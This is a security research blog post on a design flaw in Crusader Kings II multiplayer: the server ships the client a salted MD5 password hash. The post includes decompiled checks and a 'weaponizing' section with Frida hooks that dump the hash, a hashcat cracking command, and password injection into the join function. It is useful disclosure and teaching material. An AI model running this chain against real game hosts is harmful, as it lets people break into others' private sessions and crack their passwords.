# The Client Keeps the Keys: A Session Password Flaw in Crusader Kings II

![](./posts/image_ck2/Pasted%20image%2020260616100719.png)

_Research made in collab with [Kylm](https://github.com/Kylm)_

---

### TL;DR

To protect its multiplayer sessions, _Crusader Kings II_ (Clausewitz engine, 64-bit build) asks for a password. Nothing crazy so far. Except that to determine whether the user typed the correct password, the game doesn't bother waiting for the server's opinion: **the client validates the answer itself**.

The server generously ships a non-iterated MD5 hash and a plaintext salt straight to the client. The client then does its little math homework in its own corner. Translation: the secret guarding the door is literally printed _on_ the door. A quick GPU cycle later, and you are walking right in.

---

### Step 1: String Hunting

The classic starting point for any slightly lazy reverse engineer: open IDA/Ghidra, navigate to the defined strings table, and search for anything password-related.

Two families stand out:

- `BAD_SERVER_PASSWORD`: A localization key for the UI. This is the client side crying because it messed up.
- `Incorrect password`, `Need password`, `Correct password`: Negotiation vocabulary. This smells like the host.

![](./posts/image_ck2/Pasted%20image%2020260615174328.png)

---

### Step 2: Following the Cross-References

We place some _Xrefs_ on our strings to map out the battlefield:

- `xrefs_to 0x1410659c0` → `sub_14071AC30` (client join)
- `xrefs_to 0x1410eaaa8` → `sub_140D10360` (host validation)

Two functions, two worlds. Honor to the client.

![](./posts/image_ck2/Pasted%20image%2020260615174517.png)
![](./posts/image_ck2/Pasted%20image%2020260615174536.png)

---

### Step 3: Autopsy of the Client Routine (`sub_14071AC30`)

Decompiling the client-side join function, the verification logic stares us right in the face. No need to look far; the magic constants `1732584193` and `-271733879` immediately betray a good old **MD5** initialization vector.

The (cleaned up) pseudo-code looks like this:

```c
// sub_14071AC30 
if ( session->has_password ) // *(this + 1080): stored hash size != 0
{
    md5[0] = 0x67452301; // MD5 magic constants
    md5[1] = 0xEFCDAB89;
    md5[2] = 0x98BADCFE;
    md5[3] = 0x10325476;
    
    md5_update(md5, input_password);       // 1) The password typed by the user
    md5_update(md5, &session->salt);       // 2) The salt (stored at offset +1096)
    md5_finalize(md5);
    hex = md5_hex_digest(md5, buf);        // -> 32-character hex string

    // The verdict: std::string comparison
    if ( au_re_memcmp(&hex, &session->stored_hash) ) // != 0 => Miss!
    {
        // --- The path of shame ---
        set_widget_text("info_text", localize("BAD_SERVER_PASSWORD"));
        goto LABEL_46; // Abort the connection
    }
}
// ... otherwise, welcome to the lobby ...
```

#### Juicy Details

1. **The Format:** `md5_hex_digest` spits out a classic `%02x` format over 16 iterations, yielding a 32-character lowercase hex string. For Hashcat, this is paradise: it is exactly **mode 10** (`MD5($pass.$salt)`).
2. **The Comparison:** The `au_re_memcmp` routine is not password-specific. It is a standard `std::string::compare` (handling MSVC's SSO optimization) reused everywhere in the binary. **Note to patchers:** tampering with this function globally will destroy the game (std::map keys and sorting logic will implode). You must target the specific call site.

#### At the Assembly Level, the Pivot Point

```asm
14071ade8    call    au_re_memcmp
14071aded    test    eax, eax
14071adef    jz      loc_14071AEC7        ; eax == 0 -> All good, proceed
14071adf5    ...                          ; The BAD_SERVER_PASSWORD block
```

![](./posts/image_ck2/Pasted%20image%2020260615174735.png)
![](./posts/image_ck2/Pasted%20image%2020260615174933.png)

---

### Step 4: The Host-Side Validation Trap (`sub_140D10360`)

If you think a naive `patch byte` on the `jz` (0x14071ADEF) to force the jump is enough to bypass the check, you are about to hit a brick wall. The connection initiates... and then gets brutally rejected. Why? Because Paradox developers still put a secondary check on the server side (shoutout to the Jenkins build logs left in the binary: `D:\jenkins\workspace\ck2\...`).

On the host side, we find this:

```asm
140d10d4b    cmp    qword ptr [rcx+258h], 0   ; Does the host have a password?
140d10d53    jz     loc_140D10EDA             ; No -> Welcome
140d10d59    add    rcx, 248h                 ; Secret stored host-side
140d10d60    lea    rdx, [rsp+...]            ; Value received from the client
140d10d68    call   au_re_memcmp              ; Comparison
140d10d6d    test   eax, eax
140d10d6f    jz     loc_140D10EDA             ; Match -> "Correct password"
```

The server expects you to send the _actual_ plaintext password so it can perform its own verification. Forcing the client to validate a fake password does absolutely nothing for the networking phase.

![](./posts/image_ck2/Pasted%20image%2020260615175137.png)

---

### Step 5: The Vulnerability (Laid Bare)

Let's summarize the architectural tragedy: to allow the client to graphically say "Wrong password", the server hands over the reference hash _before any authentication even takes place_.

Aggravating factors that bring joy:

- The secret protects a host-side resource, but is shipped to the client.
- It is **raw MD5**, salted only with the host's username (read in the clear at offset `+1096`).
- On an RTX 3070, raw MD5 hashing runs at roughly **22 GH/s**. Needless to say, the secret won't stand a chance.

Core rule of AppSec: **Never ask a client to verify a secret it shouldn't know.** Verification belongs to whoever holds the resource.

---

### Step 6: Weaponizing the Exploit

Since the client has everything it needs, we can help it out a bit using a quick Frida script to automate recovery and injection.

#### A. Hook and Extraction

We hook onto `sub_14071AC30` to dump MSVC's `std::string` structures:

```js
// Frida Agent
const self = args[0]; // 'this' pointer
const hash = readStdString(self.add(1064)); // The leaked reference hash
const salt = readStdString(self.add(1096)); // The salt (host's username)
console.log(`[+] Found Hash: ${hash}:${salt}`);
```

#### B. Brute-Forcing into Oblivion

We feed our favorite cracking tool in mode 10:

```bash
echo "hash_hex:salt" > hash.txt
hashcat -m 10 -a 0 hash.txt rockyou.txt --force
```

Given the speed of MD5 on modern GPUs, if the password is in the wordlist, the plaintext drops in less time than it takes to load a CK2 save game.

#### C. The Legitimate Assault

No need to patch the binary or corrupt the execution flow. We simply reinject the freshly cracked password into the function's argument (register `r8` / `args[2]`).

```js
// Once the plaintext is recovered, overwrite the argument before the function executes
if (passwordPlainText !== null) {
    args[2] = Memory.allocUtf8String(passwordPlainText);
}
```

Check #1 (client) passes because the hash matches, and Check #2 (server) passes with flying colors because we sent the actual expected string. You are officially in the lobby, ready to assassinate the first heir in sight.

The failure of the naive jump patch (`jz`) approach proves that **the real issue isn't the strength of the local validation routine, but rather the initial leak of the secret**.
